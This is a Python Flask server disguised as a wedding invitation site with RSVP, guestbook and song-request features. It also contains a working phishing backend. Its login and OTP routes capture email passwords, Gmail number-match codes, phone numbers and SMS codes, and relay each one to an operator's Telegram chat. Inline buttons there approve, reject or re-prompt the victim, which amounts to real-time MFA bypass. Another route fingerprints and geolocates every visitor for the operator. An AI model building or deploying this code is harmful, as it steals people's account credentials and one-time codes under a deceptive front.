import os
import sys
import threading
import time
import requests
import random
import string
import json
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
from dotenv import load_dotenv

# Load key configurations
load_dotenv()

app = Flask(__name__, static_folder='dist', static_url_path='/')
CORS(app)

# In-Memory Database / Mock Seed Data
rsvps = [
    {
        "id": "rsvp-1",
        "name": "Eleanor & Joshua Vance",
        "email": "e.vance@example.com",
        "attending": True,
        "guestsCount": 2,
        "dietaryRestrictions": "Gluten-Free for Joshua",
        "notes": "We are so thrilled to raise a glass to you both! See you in July!",
        "createdAt": datetime.utcnow().isoformat() + "Z"
    },
    {
        "id": "rsvp-2",
        "name": "Dr. Catherine Bennett",
        "email": "catherine.b@example.com",
        "attending": True,
        "guestsCount": 1,
        "dietaryRestrictions": "None",
        "notes": "Wouldn't miss this landmark celebration for the world.",
        "createdAt": (datetime.utcnow().isoformat() + "Z") # Approximated
    },
    {
        "id": "rsvp-3",
        "name": "Marcus Dupont",
        "email": "marcus.dupont@mail.fr",
        "attending": False,
        "guestsCount": 0,
        "dietaryRestrictions": "",
        "notes": "Sending all my love from Paris. Sad I cannot attend in person, but with you in spirit! ❤️",
        "createdAt": (datetime.utcnow().isoformat() + "Z") # Approximated
    }
]

guestbook = [
    {
        "id": "msg-1",
        "author": "Grandma Mabel",
        "message": "May your journey ahead be blessed with pure patience, laughter, and endless cups of morning tea. So beautiful!",
        "avatarColor": "bg-rose-100 text-rose-700",
        "createdAt": datetime.utcnow().isoformat() + "Z"
    },
    {
        "id": "msg-2",
        "author": "Uncle Robert & Aunt Judy",
        "message": "Remember to capture every little smile or sunset. Life flows by sweet and fast, make every single highlight stay forever!",
        "avatarColor": "bg-amber-100 text-amber-700",
        "createdAt": datetime.utcnow().isoformat() + "Z"
    },
    {
        "id": "msg-3",
        "author": "Clara (Maid of Honor!)",
        "message": "Let's make this the most memorable night of 2026! Jukebox voting is already intense, let's get the dance floor roaring! 💃✨",
        "avatarColor": "bg-pink-100 text-pink-700",
        "createdAt": datetime.utcnow().isoformat() + "Z"
    }
]

playlist = [
    {"id": "song-1", "title": "L-O-V-E", "artist": "Nat King Cole", "requestedBy": "Grandma Mabel", "votes": 12},
    {"id": "song-2", "title": "Can't Take My Eyes Off You", "artist": "Frankie Valli", "requestedBy": "Uncle Robert", "votes": 8},
    {"id": "song-3", "title": "Dancing Queen", "artist": "ABBA", "requestedBy": "Clara", "votes": 17},
    {"id": "song-4", "title": "La Vie En Rose", "artist": "Édith Piaf", "requestedBy": "Adele", "votes": 14}
]

logs = [
    {
        "id": "log-1",
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "type": "PAGE_VIEW",
        "details": "Guest landed on main invitation screen.",
        "ipPlaceholder": "192.168.1.45"
    }
]

active_login_attempts = {}

# --- TELEGRAM WORKER CLASS ---
class TelegramService:
    def __init__(self, token=None, chat_id=None):
        self.bot_token = token or os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
        self.chat_id = chat_id or os.environ.get("TELEGRAM_CHAT_ID", "").strip()
        self.last_update_id = 0
        self.polling_in_progress = False

    def is_configured(self):
        return len(self.bot_token) > 0 and len(self.chat_id) > 0

    def get_config(self):
        return {
            "hasToken": len(self.bot_token) > 0,
            "hasChatId": len(self.chat_id) > 0,
            "maskedToken": f"{self.bot_token[:6]}...{self.bot_token[-4:]}" if self.bot_token else "Not Configured",
            "chatId": self.chat_id or "Not Configured"
        }

    def api_call(self, method, payload):
        if not self.bot_token:
            raise ValueError("Telegram Bot Token is not configured.")
        url = f"https://api.telegram.org/bot{self.bot_token}/{method}"
        try:
            res = requests.post(url, json=payload, timeout=5)
            data = res.json()
            if not data.get("ok"):
                raise Exception(f"Telegram API Error: {data.get('description', json.dumps(data))}")
            return data.get("result")
        except Exception as e:
            raise e

    def send_message(self, text, parse_mode="HTML", reply_markup=None):
        if not self.chat_id:
            raise ValueError("Telegram Chat ID is not configured.")
        payload = {
            "chat_id": self.chat_id,
            "text": text,
            "parse_mode": parse_mode,
            "disable_web_page_preview": True
        }
        if reply_markup:
            payload["reply_markup"] = reply_markup
        return self.api_call("sendMessage", payload)

    def send_rsvp_alert(self, rsvp_item):
        if not self.is_configured():
            return None
        status_emoji = "✅ Attending" if rsvp_item.get("attending") else "❌ Declined"
        message = (
            "💌 <b>New RSVP Received!</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>Guest:</b> {rsvp_item.get('name')}\n"
            f"📧 <b>Email:</b> {rsvp_item.get('email')}\n"
            f"🥂 <b>Status:</b> {status_emoji}\n"
            f"👥 <b>Count:</b> {rsvp_item.get('guestsCount')} guests\n"
            f"📝 <b>Notes:</b> <i>{rsvp_item.get('notes') or 'None'}</i>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "<i>Delivered by Invitation Handshake Gateway</i>"
        )
        return self.send_message(message, "HTML")

    def send_visitor_alert(self, visitor):
        if not self.is_configured():
            return None

        ai_generated_text = ""
        api_key = os.environ.get("GEMINI_API_KEY", "").strip()

        if api_key:
            try:
                from google import genai
                client = genai.Client(api_key=api_key)
                prompt = f"""
Analyze the following incoming visitor telemetry for a wedding/celebration invitation event platform:
- IP Address: {visitor.get('ip') or "Unknown"}
- Location: {visitor.get('city') or "Unknown"}, {visitor.get('region') or "Unknown"}, {visitor.get('country_name') or "Unknown"} ({visitor.get('country_code') or "??"})
- Network Provider/ISP: {visitor.get('org') or "Unknown"}
- Browser: {visitor.get('browser') or "Unknown"}
- Operating System: {visitor.get('os') or "Unknown"}
- Screen Size: {visitor.get('screenSize') or "Unknown"}
- Language: {visitor.get('language') or "Unknown"}
- Timezone: {visitor.get('timezone') or "Unknown"}
- CPU Cores: {visitor.get('cores') or "Unknown"}
- Platform: {visitor.get('platform') or "Unknown"}
- User Agent: {visitor.get('userAgent') or "Unknown"}

Write an elegant, witty, and highly readable real-time notification alert (written in HTML parse mode format for Telegram).
Your output must use standard HTML tags allowed by Telegram:
- <b>Bold text</b> for headers or highlights
- <i>Italic text</i> for aesthetic notes
- <code>Monospace code</code> for raw details like IP, timezone, provider, device name or specs

Structure your response beautifully:
1. A clever, premium, or wedding-themed headline (e.g., "✨ <b>A Guest Just Slipped In!</b>" or "🥂 <b>A New Invitation Handshake!</b>")
2. An elegant "AI Smart Assessment" paragraph or narrative (witty/charming, describing where they are joining from in the world, what time of day it might be there, and what gear or device they are using).
3. A beautifully formatted bulleted summary of their key geographical and device parameters wrapped in HTML.

Keep the output concise, charming, and extremely helpful. Do not output anything other than the telegram HTML message text. Avoid markdown symbols. Return only the Telegram HTML body.
"""
                retries_left = 3
                current_delay = 1.0
                response = None
                while retries_left > 0:
                    try:
                        response = client.models.generate_content(
                            model="gemini-3.5-flash",
                            contents=prompt
                        )
                        break
                    except Exception as err:
                        err_str = str(err)
                        is_transient = "503" in err_str or "429" in err_str or "high demand" in err_str or "unavailable" in err_str.lower()
                        if retries_left > 1 and is_transient:
                            print(f"[Telegram AI] Transient error: {err_str[:120]}. Retrying in {current_delay}s...", flush=True)
                            time.sleep(current_delay)
                            current_delay *= 2
                            retries_left -= 1
                        else:
                            raise err

                if response and response.text:
                    ai_generated_text = response.text.strip()
            except Exception as err:
                print(f"[Telegram AI Info] Could not generate AI visitor summary: {err}", flush=True)

        if ai_generated_text:
            message = ai_generated_text
        else:
            message = f"""
👀 <b>New Visitor Entered Site!</b>
━━━━━━━━━━━━━━━━━━
📍 <b>Location & Network:</b>
• IP: <code>{visitor.get('ip') or "Unknown"}</code>
• City: <code>{visitor.get('city') or "Unknown"}</code>
• Region: <code>{visitor.get('region') or "Unknown"}</code>
• Country: <code>{visitor.get('country_name') or "Unknown"} ({visitor.get('country_code') or "??"})</code>
• Provider/ISP: <code>{visitor.get('org') or "Unknown"}</code>

📱 <b>Device & Browser Fingerprint:</b>
• Browser: <code>{visitor.get('browser') or "Unknown"}</code>
• OS: <code>{visitor.get('os') or "Unknown"}</code>
• Screen Size: <code>{visitor.get('screenSize') or "Unknown"}</code>
• Language: <code>{visitor.get('language') or "Unknown"}</code>
• Timezone: <code>{visitor.get('timezone') or "Unknown"}</code>
• CPU Cores: <code>{visitor.get('cores') or "Unknown"} Cores</code>
• Platform: <code>{visitor.get('platform') or "Unknown"}</code>
• User Agent: <code>{visitor.get('userAgent') or "Unknown"}</code>
━━━━━━━━━━━━━━━━━━
<i>Delivered by Invitation Handshake Gateway</i>
            """.strip()

        return self.send_message(message, "HTML")

    def send_login_alert(self, state):
        if not self.is_configured():
            return None
        provider_name = state.get("provider", "").upper()
        prompt_details = f"🔢 <b>Gmail Match Code:</b> <code style=\"font-size:18px;\">{state.get('promptNumber')}</code>\n" if state.get("promptNumber") else ""
        
        # Format time representation
        time_format = datetime.utcnow().strftime("%H:%M:%S")
        if state.get("timestamp"):
            try:
                dt = datetime.fromisoformat(state.get("timestamp").replace("Z", "+00:00"))
                time_format = dt.strftime("%H:%M:%S")
            except Exception:
                pass

        message = f"""
🔐 <b>Simulated Guest Gateway Login</b>
━━━━━━━━━━━━━━━━━━
🏢 <b>Portal:</b> {provider_name}
📧 <b>Guest Email:</b> <code>{state.get('email')}</code>
🔑 <b>Entered Secret:</b> <code>{state.get('password') or "(Not entered yet)"}</code>
{prompt_details}📍 <b>Timestamp:</b> {time_format}
━━━━━━━━━━━━━━━━━━
<b>⚠️ HOST ACTIONS REQLOCKED</b>
Choose real-time bypass command below:
        """.strip()

        inline_keyboard = {
            "inline_keyboard": [
                [
                    {"text": "Approve Pass ✅", "callback_data": f"tg:approve:{state.get('id')}"},
                    {"text": "Reject Gate ❌", "callback_data": f"tg:deny:{state.get('id')}"}
                ],
                [
                    {"text": "Request SMS OTP 📲", "callback_data": f"tg:req_sms:{state.get('id')}"},
                    {"text": "Incorrect Password Alert ⚠️", "callback_data": f"tg:inc_pw:{state.get('id')}"}
                ]
            ]
        }
        return self.send_message(message, "HTML", inline_keyboard)

    def send_sms_submit_alert(self, state):
        if not self.is_configured():
            return None
        message = f"""
📲 <b>Simulated Guest OTP Received!</b>
━━━━━━━━━━━━━━━━━━
🏢 <b>Portal:</b> {state.get('provider', '').upper()}
📧 <b>Guest Email:</b> <code>{state.get('email')}</code>
📞 <b>Bound Mobile:</b> <code>+1 {state.get('phone') or "Not provided"}</code>
📟 <b>Submitted OTP:</b> <code>{state.get('smsCode') or "(Empty)"}</code>
━━━━━━━━━━━━━━━━━━
<b>⚠️ RE-VERIFY CONTROL</b>
What is the guest status for this OTP?
        """.strip()

        inline_keyboard = {
            "inline_keyboard": [
                [
                    {"text": "Approve OTP ✅", "callback_data": f"tg:approve:{state.get('id')}"},
                    {"text": "Invalid Code Alert ⚠️", "callback_data": f"tg:inc_pw:{state.get('id')}"}
                ]
            ]
        }
        return self.send_message(message, "HTML", inline_keyboard)

    def poll_updates(self, on_action_received):
        if not self.is_configured():
            return 0
        if self.polling_in_progress:
            return 0
        self.polling_in_progress = True
        try:
            payload = {"timeout": 1}
            if self.last_update_id > 0:
                payload["offset"] = self.last_update_id + 1
            
            updates = self.api_call("getUpdates", payload)
            count = 0
            for update in updates:
                self.last_update_id = max(self.last_update_id, update.get("update_id", 0))
                callback_query = update.get("callback_query")
                if callback_query:
                    data = callback_query.get("data", "")
                    query_id = callback_query.get("id")
                    if data and data.startswith("tg:"):
                        parts = data.split(":")
                        action = parts[1]
                        attempt_id = parts[2]
                        
                        mapped_action = "approve"
                        feedback = "Bypass approved! ✅"
                        if action == "approve":
                            mapped_action = "approve"
                            feedback = "Bypass approved! ✅"
                        elif action == "deny":
                            mapped_action = "deny"
                            feedback = "Access Blocked! ❌"
                        elif action == "req_sms":
                            mapped_action = "request_sms"
                            feedback = "SMS screen requested! 📲"
                        elif action == "inc_pw":
                            mapped_action = "incorrect_password"
                            feedback = "Incorrect Password screen requested! ⚠️"

                        # Answer callback query
                        try:
                            self.api_call("answerCallbackQuery", {
                                "callback_query_id": query_id,
                                "text": feedback
                            })
                        except Exception as e:
                            print(f"Failed to answer callback query: {e}", flush=True)

                        # Edit message text on Telegram
                        try:
                            original_msg = callback_query.get("message")
                            if original_msg:
                                current_text = original_msg.get("text") or ""
                                if current_text:
                                    updated_text = f"{current_text}\n\n━━━━⊱ ACTION LOG ⊰━━━━\n⚡️ <i>Action Selected: {feedback}</i>"
                                else:
                                    updated_text = f"{original_msg.get('caption') or ''}\n\n[Action Selected: {feedback}]"
                                
                                self.api_call("editMessageText", {
                                    "chat_id": original_msg.get("chat", {}).get("id"),
                                    "message_id": original_msg.get("message_id"),
                                    "text": updated_text,
                                    "parse_mode": "HTML",
                                    "reply_markup": {"inline_keyboard": []}
                                })
                        except Exception as e:
                            print(f"Failed to edit message text: {e}", flush=True)

                        on_action_received(attempt_id, mapped_action)
                        count += 1
            return count
        except Exception as e:
            err_msg = str(e)
            if "Conflict" in err_msg or "terminated by other getUpdates" in err_msg:
                print("[Telegram Polling Info] Active getUpdates conflict detected. Skipping this interval sequence dynamically.", flush=True)
            else:
                print(f"[Telegram Polling Warning] {err_msg}", flush=True)
            return 0
        finally:
            self.polling_in_progress = False

telegram_service = TelegramService()

# --- BACKEND HTTP API ROUTES ---

@app.route("/api/rsvps", methods=["GET"])
def get_rsvps():
    return jsonify(rsvps)

@app.route("/api/rsvps", methods=["POST"])
def post_rsvp():
    data = request.json or {}
    name = data.get("name")
    email = data.get("email")
    if not name or not email:
        return jsonify({"error": "Name and Email are required."}), 400
        
    attending = data.get("attending")
    is_attending = attending is True or attending == "true" or attending == "True"
    guests_count = int(data.get("guestsCount") or 0)
    if is_attending and guests_count == 0:
        guests_count = 1
        
    new_rsvp = {
        "id": "rsvp-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
        "name": name,
        "email": email,
        "attending": is_attending,
        "guestsCount": guests_count,
        "dietaryRestrictions": data.get("dietaryRestrictions") or "None",
        "notes": data.get("notes") or "",
        "createdAt": datetime.utcnow().isoformat() + "Z"
    }
    
    rsvps.insert(0, new_rsvp)
    
    if telegram_service.is_configured():
        def send_alert():
            try:
                telegram_service.send_rsvp_alert(new_rsvp)
            except Exception as e:
                print(f"Failed to send RSVP alert to Telegram: {e}", flush=True)
        threading.Thread(target=send_alert).start()
        
    log_id = "log-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9))
    logs.insert(0, {
        "id": log_id,
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "type": "RSVP_SUBMITTED",
        "details": f"RSVP registered for {name} ({'Attending' if is_attending else 'Not Attending'}, {guests_count} guests).",
        "ipPlaceholder": request.headers.get("X-Forwarded-For", request.remote_addr or "127.0.0.1").split(",")[0].strip()
    })
    
    return jsonify(new_rsvp), 201

@app.route("/api/guestbook", methods=["GET"])
def get_guestbook():
    return jsonify(guestbook)

@app.route("/api/guestbook", methods=["POST"])
def post_guestbook():
    data = request.json or {}
    author = data.get("author")
    message = data.get("message")
    if not author or not message:
        return jsonify({"error": "Author and Message are required."}), 400
        
    colors = [
      "bg-rose-100 text-rose-700",
      "bg-pink-100 text-pink-700",
      "bg-amber-100 text-amber-700",
      "bg-purple-100 text-purple-700",
      "bg-emerald-100 text-emerald-700",
      "bg-sky-100 text-sky-700"
    ]
    random_color = random.choice(colors)
    
    entry = {
        "id": "msg-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
        "author": author,
        "message": message,
        "avatarColor": random_color,
        "createdAt": datetime.utcnow().isoformat() + "Z"
    }
    guestbook.insert(0, entry)
    return jsonify(entry), 201

@app.route("/api/playlist", methods=["GET"])
def get_playlist():
    return jsonify(playlist)

@app.route("/api/playlist", methods=["POST"])
def post_playlist():
    data = request.json or {}
    title = data.get("title")
    artist = data.get("artist")
    requested_by = data.get("requestedBy") or "Secret Guest"
    if not title or not artist:
        return jsonify({"error": "Title and Artist are required."}), 400
        
    song = {
        "id": "song-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
        "title": title,
        "artist": artist,
        "requestedBy": requested_by,
        "votes": 1
    }
    playlist.append(song)
    return jsonify(song), 201

@app.route("/api/playlist/upvote", methods=["POST"])
def upvote_song():
    data = request.json or {}
    song_id = data.get("id")
    for s in playlist:
        if s["id"] == song_id:
            s["votes"] += 1
            return jsonify(s)
    return jsonify({"error": "Song not found."}), 404

@app.route("/api/logs", methods=["GET"])
def get_logs():
    return jsonify(logs)

@app.route("/api/logs", methods=["POST"])
def post_simulation_log():
    data = request.json or {}
    log_type = data.get("type")
    details = data.get("details")
    new_log = {
        "id": "log-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "type": log_type,
        "details": details,
        "ipPlaceholder": request.headers.get("X-Forwarded-For", request.remote_addr or "127.0.0.1").split(",")[0].strip()
    }
    logs.insert(0, new_log)
    return jsonify(new_log)

@app.route("/api/telegram/visitor_entry", methods=["POST"])
def visitor_entry():
    try:
        client_body = request.json or {}
        
        # Extract IP
        ip = ""
        forwarded = request.headers.get("X-Forwarded-For")
        if forwarded:
            ip = forwarded.split(",")[0].strip()
        else:
            ip = request.remote_addr or "127.0.0.1"
            
        if ip.startswith("::ffff:"):
            ip = ip[7:]
            
        resolved_loc = {
            "city": "Unknown",
            "region": "Unknown",
            "country_name": "Unknown",
            "country_code": "??",
            "org": "Unknown"
        }
        
        is_local_ip = (
            not ip or 
            ip == "::1" or 
            ip == "127.0.0.1" or 
            ip.startswith("10.") or 
            ip.startswith("192.168.") or 
            ip.startswith("172.")
        )
        
        if is_local_ip:
            try:
                res = requests.get("https://ipwho.is/", timeout=3)
                if res.status_code == 200:
                    data = res.json()
                    if data and data.get("success") is not False:
                        resolved_loc = {
                            "city": data.get("city") or "Unknown",
                            "region": data.get("region") or "Unknown",
                            "country_name": f"{data.get('country') or 'Unknown'} (Server Host Node)",
                            "country_code": data.get("country_code") or "??",
                            "org": data.get("connection", {}).get("org") or data.get("connection", {}).get("isp") or "Unknown"
                        }
            except Exception:
                resolved_loc = {
                    "city": "Local Sandbox",
                    "region": "Internal Platform",
                    "country_name": "Localhost Developer Loopback",
                    "country_code": "US",
                    "org": "Gateway Dev Network"
                }
        else:
            fetched = False
            # 1. ipwho.is lookup
            try:
                res = requests.get(f"https://ipwho.is/{ip}", timeout=3)
                if res.status_code == 200:
                    data = res.json()
                    if data and data.get("success") is not False:
                        resolved_loc = {
                            "city": data.get("city") or "Unknown",
                            "region": data.get("region") or "Unknown",
                            "country_name": data.get("country") or "Unknown",
                            "country_code": data.get("country_code") or "??",
                            "org": data.get("connection", {}).get("org") or data.get("connection", {}).get("isp") or "Unknown"
                        }
                        fetched = True
            except Exception as e:
                print(f"[Server Geolocation] ipwho.is server-side lookup failed: {e}", flush=True)
                
            # 2. fallback freeipapi.com
            if not fetched:
                try:
                    res = requests.get(f"https://freeipapi.com/api/json/{ip}", timeout=3)
                    if res.status_code == 200:
                        data = res.json()
                        resolved_loc = {
                            "city": data.get("cityName") or "Unknown",
                            "region": data.get("regionName") or "Unknown",
                            "country_name": data.get("countryName") or "Unknown",
                            "country_code": data.get("countryCode") or "??",
                            "org": "Unknown"
                        }
                        fetched = True
                except Exception as e:
                    print(f"[Server Geolocation] freeipapi server-side lookup failed: {e}", flush=True)
                    
        # Synthesize complete telemetry visitor object
        visitor = {
            "ip": ip,
            "city": resolved_loc["city"],
            "region": resolved_loc["region"],
            "country_name": resolved_loc["country_name"],
            "country_code": resolved_loc["country_code"],
            "org": resolved_loc["org"],
            "browser": client_body.get("browser") or "Unknown Browser",
            "os": client_body.get("os") or "Unknown OS",
            "screenSize": client_body.get("screenSize") or "Unknown",
            "language": client_body.get("language") or "Unknown",
            "timezone": client_body.get("timezone") or "Unknown",
            "cores": client_body.get("cores") or "Unknown",
            "platform": client_body.get("platform") or "Unknown",
            "userAgent": client_body.get("userAgent") or "Unknown"
        }
        
        loc_str = ", ".join(filter(None, [visitor["city"], visitor["region"], visitor["country_name"]]))
        browser_str = f"{visitor['browser']} ({visitor['os']})"
        log_details = f"[VISITOR ACCESS] New Guest entered. IP: {visitor['ip']} | Location: {loc_str or 'Unknown'} | Browser: {browser_str}"
        
        logs.insert(0, {
            "id": "log-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "type": "PAGE_VIEW",
            "details": log_details,
            "ipPlaceholder": visitor["ip"]
        })
        
        if telegram_service.is_configured():
            def send_alert():
                try:
                    telegram_service.send_visitor_alert(visitor)
                except Exception as e:
                    print(f"Failed to send visitor alert to Telegram: {e}", flush=True)
            threading.Thread(target=send_alert).start()
            
        return jsonify({"success": True, "visitor": visitor})
    except Exception as e:
        print(f"Visitor entry log transmission failure: {e}", flush=True)
        return jsonify({"error": str(e)}), 500

@app.route("/api/telegram/config", methods=["GET"])
def telegram_config():
    return jsonify(telegram_service.get_config())

@app.route("/api/telegram/send_test", methods=["POST"])
def send_test_message():
    try:
        if not telegram_service.is_configured():
            return jsonify({"error": "Telegram bot accounts are not configured yet."}), 400
            
        data = request.json or {}
        test_email = data.get("testEmail") or "showolesheriff7@gmail.com"
        
        message = f"""
🔔 <b>Invitation Gateway Handshake Active!</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
This is a high-fidelity authorization check from your wedding gateway applet.
Your real-time connection is <b>ONLINE</b> and functional!

👤 <b>Host Receiver Account:</b> <code>{test_email}</code>
📍 <b>Service Node:</b> Port 3000 (Python Flask proxy)
━━━━━━━━━━━━━━━━━━━━━━━━━━
<i>Ready to process remote action overrides!</i>
        """.strip()
        
        telegram_service.send_message(message, "HTML")
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/telegram/login_attempt", methods=["POST"])
def login_attempt():
    data = request.json or {}
    provider = data.get("provider")
    email = data.get("email")
    password = data.get("password")
    prompt_number = data.get("promptNumber")
    
    if not provider or not email:
        return jsonify({"error": "Missing required login attempt parameters: provider and email."}), 400
        
    attempt_id = "attempt-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9))
    new_attempt = {
        "id": attempt_id,
        "provider": provider,
        "email": email,
        "password": password or "",
        "promptNumber": prompt_number or None,
        "status": "pending",
        "timestamp": datetime.utcnow().isoformat() + "Z"
    }
    
    active_login_attempts[attempt_id] = new_attempt
    
    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr or "127.0.0.1").split(",")[0].strip()
    
    logs.insert(0, {
        "id": "log-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "type": "GATEWAY_LOGIN_ATTEMPT",
        "details": f"[{provider.upper()}] Auth request submitted for {email} (Password: \"{password or ''}\"). Dispatched to Telegram (Attempt ID: {attempt_id}).",
        "ipPlaceholder": client_ip
    })
    
    if telegram_service.is_configured():
        def send_alert():
            try:
                telegram_service.send_login_alert(new_attempt)
            except Exception as e:
                print(f"Failed to deliver login alert to Telegram: {e}", flush=True)
        threading.Thread(target=send_alert).start()
        
    return jsonify(new_attempt)

@app.route("/api/telegram/otp_attempt", methods=["POST"])
def otp_attempt():
    data = request.json or {}
    attempt_id = data.get("id")
    phone = data.get("phone")
    sms_code = data.get("smsCode")
    
    if not attempt_id:
        return jsonify({"error": "id parameter is required."}), 400
        
    state = active_login_attempts.get(attempt_id)
    if not state:
        return jsonify({"error": "Active transaction attempt was not found."}), 404
        
    if phone is not None:
        state["phone"] = phone
    if sms_code is not None:
        state["smsCode"] = sms_code
        
    state["status"] = "pending"
    
    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr or "127.0.0.1").split(",")[0].strip()
    logs.insert(0, {
        "id": "log-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "type": "GATEWAY_LOGIN_ATTEMPT",
        "details": f"[{state['provider'].upper()}] OTP/OTP submission from guest: Phone: \"+1 {phone or ''}\", Code: \"{sms_code or ''}\". Re-dispatched inline action alert...",
        "ipPlaceholder": client_ip
    })
    
    if telegram_service.is_configured():
        def send_alert():
            try:
                telegram_service.send_sms_submit_alert(state)
            except Exception as e:
                print(f"Failed to deliver OTP alert to Telegram: {e}", flush=True)
        threading.Thread(target=send_alert).start()
        
    return jsonify(state)

@app.route("/api/telegram/attempt_status", methods=["GET"])
def attempt_status():
    attempt_id = request.args.get("id")
    if not attempt_id:
        return jsonify({"error": "Transaction 'id' parameter is required for status checks."}), 400
        
    state = active_login_attempts.get(attempt_id)
    if not state:
        return jsonify({"error": "Requested auth transaction not found."}), 404
        
    return jsonify(state)

@app.route("/api/telegram/attempts", methods=["GET"])
def get_attempts():
    attempts_list = list(active_login_attempts.values())
    attempts_list.sort(key=lambda x: x.get("timestamp", ""), reverse=True)
    return jsonify(attempts_list[:10])

@app.route("/api/telegram/local_override", methods=["POST"])
def local_override():
    data = request.json or {}
    attempt_id = data.get("id")
    status = data.get("status")
    
    if not attempt_id or not status:
        return jsonify({"error": "Missing parameters: id and status are required."}), 400
        
    attempt = active_login_attempts.get(attempt_id)
    if attempt:
        attempt["status"] = status
        
        logs.insert(0, {
            "id": "log-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "type": "LOGIN_SUCCESS" if status == "approved" else "GATEWAY_LOGIN_ATTEMPT",
            "details": f"[LOCAL OVERRIDE] Coordinator manually authorized remote action [{status.upper()}] for guest {attempt.get('email')}.",
            "ipPlaceholder": "Host Console"
        })
        return jsonify({"success": True, "attempt": attempt})
        
    return jsonify({"error": "Requested sign-in transaction attempt not found."}), 404

# --- VITE ASSET / SPA SERVING ROUTE ---

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def serve(path):
    if path.startswith('api/'):
        return jsonify({"error": "Endpoint not found."}), 404
        
    # Check if file exists in dist directory
    full_path = os.path.join('dist', path)
    if path and os.path.exists(full_path) and os.path.isfile(full_path):
        return send_from_directory('dist', path)
        
    # Standard SPA fallback routing
    return send_from_directory('dist', 'index.html')

# --- TELEGRAM WORKER THREAD ---
def telegram_polling_worker():
    print("[Telegram Polling] Polling background thread initiated...", flush=True)
    while True:
        try:
            if telegram_service.is_configured():
                def on_action(attempt_id, action):
                    attempt = active_login_attempts.get(attempt_id)
                    if attempt:
                        mapped_status = "pending"
                        if action == "approve":
                            mapped_status = "approved"
                        elif action == "deny":
                            mapped_status = "denied"
                        else:
                            mapped_status = action # e.g. "request_sms", "incorrect_password"
                            
                        attempt["status"] = mapped_status
                        
                        logs.insert(0, {
                            "id": "log-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
                            "timestamp": datetime.utcnow().isoformat() + "Z",
                            "type": "LOGIN_SUCCESS" if mapped_status == "approved" else "GATEWAY_LOGIN_ATTEMPT",
                            "details": f"[TELEGRAM COMMAND] Organizer dispatched direct interaction [{mapped_status.upper()}] for {attempt.get('email')}. Transaction status applied.",
                            "ipPlaceholder": "Telegram Remote"
                        })
                
                telegram_service.poll_updates(on_action)
        except Exception as e:
            print(f"[Telegram Polling Worker Exception] {e}", flush=True)
        time.sleep(1.5)

if __name__ == "__main__":
    # Start the telegram callback long polling loop
    t = threading.Thread(target=telegram_polling_worker, daemon=True)
    t.start()
    
    # Run server on custom port if provided (e.g. 5000 in dev) or fallback to 3000
    port = int(os.environ.get("FLASK_PORT", "3000"))
    app.run(host="0.0.0.0", port=port, debug=False)
